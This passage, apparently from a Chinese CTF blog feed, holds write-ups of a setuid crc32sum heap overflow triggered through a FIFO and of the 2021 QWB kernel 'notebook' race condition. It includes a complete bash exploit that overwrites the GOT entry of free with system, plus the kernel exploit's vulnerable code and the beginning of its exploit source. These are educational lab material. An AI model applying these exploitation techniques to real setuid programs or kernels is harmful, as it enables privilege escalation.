*/</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s: %08x\\n&quot;</span>, filepath, crc32(buffer, stbuf.st_size));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Cleanup */</span></span><br><span class=\"line\">  <span class=\"built_in\">free</span>(buffer);</span><br><span class=\"line\">  flock(fd, LOCK_UN);</span><br><span class=\"line\">  close(fd);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Entry point</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *filepath;</span><br><span class=\"line\"></span><br><span class=\"line\">  setreuid(geteuid(), geteuid());</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (argc &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Usage: %s &lt;file&gt; ...\\n&quot;</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (system(<span class=\"string\">&quot;/usr/bin/which crc32 &gt; /dev/null&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Your system has `crc32` too&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">1</span>; i &lt; argc; i++) &#123;</span><br><span class=\"line\">    filepath = strdup(argv[i]);</span><br><span class=\"line\">    crc32sum(filepath);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(filepath);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>思路 对于 <code>FIFO</code>  的管道   <code>stbuf.st_size</code>  是 0 这就造成了堆溢出<br>\n我们可以 <code>mkfifo</code>  创建堆块 然后溢出到下面的 0x40 的块（前提是要布置好两个 0x40)<br>\n 然后劫持 tcache 到 got 在劫持 free 成 system 的 plt<br>\n 这样就能直接 free (cmd) 命令执行了</p>\n<p>难点在于 strdup 会干扰堆布局 需要思考<br>\n和第一次 printf 会创建 0x400 的缓冲区 需要 bypass 这两即可</p>\n<h2 id=\"fifo\"><a class=\"markdownIt-Anchor\" href=\"#fifo\">#</a> FIFO</h2>\n<p><strong>命名管道</strong>也被称为 FIFO 文件<br>\n管道是没法被 stat 结构体读取到数据的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;limits.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/file.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> pipefd[<span class=\"number\">2</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pipe(pipefd) == <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;pipe&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">stbuf</span>;</span></span><br><span class=\"line\">\tfstat(pipefd[<span class=\"number\">0</span>], &amp;stbuf);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, stbuf.st_size);<span class=\"comment\">// 0</span></span><br><span class=\"line\">\tfstat(pipefd[<span class=\"number\">1</span>], &amp;stbuf);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, stbuf.st_size);<span class=\"comment\">// 0</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"exp-3\"><a class=\"markdownIt-Anchor\" href=\"#exp-3\">#</a> exp</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">path=`pwd` # TODO: modify here</span><br><span class=\"line\">target=$path/crc32sum</span><br><span class=\"line\">./cleanup.sh</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real size xx</span></span><br><span class=\"line\">A1=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class=\"line\">A2=ooooooooooooooooooooooooooooooo</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real szie 0x40</span></span><br><span class=\"line\">B=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class=\"line\">C=kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real szie 0x40</span></span><br><span class=\"line\">PL=ccccccccccccccccccccccccccccccccccccccccccccccc</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real szie 0x50</span></span><br><span class=\"line\">PIPE=pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">tmp=`<span class=\"built_in\">mktemp</span> /tmp/cake-XXX`</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">cp</span> <span class=\"variable\">$target</span> .</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">:&lt;&lt;<span class=\"string\">eof</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x30] &lt;&lt;- A&#x27;s name</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x20] &lt;&lt;- A&#x27;s content    &lt;&lt;- overflow</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x40] &lt;&lt;- B</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x40] &lt;&lt;- B</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">eof</span></span></span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0x1f)&quot; &gt; $A1</span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0xf)&quot;  &gt; $A2</span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0x2f)&quot; &gt; $B # B creat two of 0x40 real size chunk</span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0x2f)&quot; &gt; $C</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">:&lt;&lt;<span class=\"string\">eof</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tGOT\t\t\t\t\t\t\t SYM                 PLT</span></span>\t\t\t\t</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404018 free@GLIBC_2.2.5    0000000000401030</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404020 puts@GLIBC_2.2.5    0000000000401040</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404028 system@GLIBC_2.2.5  0000000000401050</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404030 printf@GLIBC_2.2.5  0000000000401060</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404038 geteuid@GLIBC_2.2.5 0000000000401070</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404040 close@GLIBC_2.2.5   0000000000401080</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">eof</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">hijack free<span class=\"string\">&#x27;s got to system&#x27;</span>s plt and retain other nothing change</span></span><br><span class=\"line\">echo -ne &quot;\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x40\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x60\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x70\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x80\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\"></span><br><span class=\"line\">python3 -c &quot;print(&#x27;S&#x27;*0x18,end=&#x27;&#x27;)&quot;          &gt; payload</span><br><span class=\"line\">echo -ne &#x27;\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27; &gt;&gt; payload</span><br><span class=\"line\">echo -ne &#x27;\\x18\\x40\\x40\\x00\\x00\\x00\\x00\\x00&#x27; &gt;&gt; payload</span><br><span class=\"line\">echo &quot;cat ~/flag&quot; &gt; cmd</span><br><span class=\"line\">mkfifo $PIPE</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">A1是发现会凭空出现一个0x400的块 间隔我们的payload</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">gdb -x gdbscript --args <span class=\"variable\">$target</span> <span class=\"variable\">$A1</span> <span class=\"variable\">$A2</span> <span class=\"variable\">$B</span> <span class=\"variable\">$PIPE</span> <span class=\"variable\">$PL</span> cmd</span> </span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">target <span class=\"variable\">$A1</span> <span class=\"variable\">$A2</span> <span class=\"variable\">$B</span> <span class=\"variable\">$PIPE</span> <span class=\"variable\">$PL</span> cmd  &amp;</span></span><br><span class=\"line\">sleep 1</span><br><span class=\"line\">cat ./payload &gt; $PIPE</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "writeup"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/09/11/kernel-notebook-three-solutions/",
            "url": "https://squirre17.github.io/2022/09/11/kernel-notebook-three-solutions/",
            "title": "kernel-notebook-three-solutions",
            "date_published": "2022-09-11T02:28:41.000Z",
            "content_html": "<h1 id=\"notebook的多种解法\"><a class=\"markdownIt-Anchor\" href=\"#notebook的多种解法\">#</a> notebook 的多种解法</h1>\n<p>2021 QWB</p>\n<p>这个题就是考锁没加好的多线程条件竞争</p>\n<h2 id=\"传统rop-ptmx\"><a class=\"markdownIt-Anchor\" href=\"#传统rop-ptmx\">#</a> 传统 ROP -ptmx</h2>\n<p>利用 realloc 指针延迟回写的效果 将 free 的块回写回控制区</p>\n<p>造成对 tty struct 结构体的控制</p>\n<p>然后泄漏 kernel base</p>\n<p>并两段栈迁移 (测试过 一段迁移不行 会卡在一个地方)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">noteedit</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">void</span> *buf)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// r13</span></span><br><span class=\"line\">  note *v5; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// r12</span></span><br><span class=\"line\">  __int64 v8; <span class=\"comment\">// rbx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  (···)</span><br><span class=\"line\">  </span><br><span class=\"line\">  v4 = v3;</span><br><span class=\"line\">  v5 = &amp;notebook[idx];</span><br><span class=\"line\">  raw_read_lock(&amp;lock);                      [<span class=\"number\">1</span>] &lt;&lt;- 加了读锁</span><br><span class=\"line\">  size = v5-&gt;size;<span class=\"comment\">// size是原size</span></span><br><span class=\"line\">  v5-&gt;size = newsize;<span class=\"comment\">// 立刻改成了我们输入的新size</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size == newsize )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v8 = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> editout;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 这里会把notefree 却没立刻置空</span></span><br><span class=\"line\">  v7 = (*(__int64 (__fastcall **)(<span class=\"type\">void</span> *, <span class=\"type\">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class=\"number\">37748928LL</span>);</span><br><span class=\"line\">  copy_from_user(name, v4, <span class=\"number\">256LL</span>);           [<span class=\"number\">2</span>] &lt;&lt;- 这里可以uffd</span><br><span class=\"line\">  <span class=\"title function_\">if</span> <span class=\"params\">( !v5-&gt;size )</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printk(<span class=\"string\">&quot;free in fact&quot;</span>);</span><br><span class=\"line\">    v5-&gt;note = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    v8 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> editout;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5-&gt;note = (<span class=\"type\">void</span> *)v7;                   [<span class=\"number\">3</span>] &lt;&lt;- 这里写回note</span><br><span class=\"line\">    v8 = <span class=\"number\">2LL</span>;</span><br><span class=\"line\">editout:</span><br><span class=\"line\">    raw_read_unlock(&amp;lock);</span><br><span class=\"line\">    printk(<span class=\"string\">&quot;[o] Edit success. %s edit a note.\\n&quot;</span>, name);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> v8;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  printk(<span class=\"string\">&quot;[x] Return ptr unvalid.\\n&quot;</span>);</span><br><span class=\"line\">  raw_read_unlock(&amp;lock);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">3LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/09/11/kernel-notebook-three-solutions/1.png\" alt=\"Pasted image 20220910152111\"></p>\n<p>exp</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span 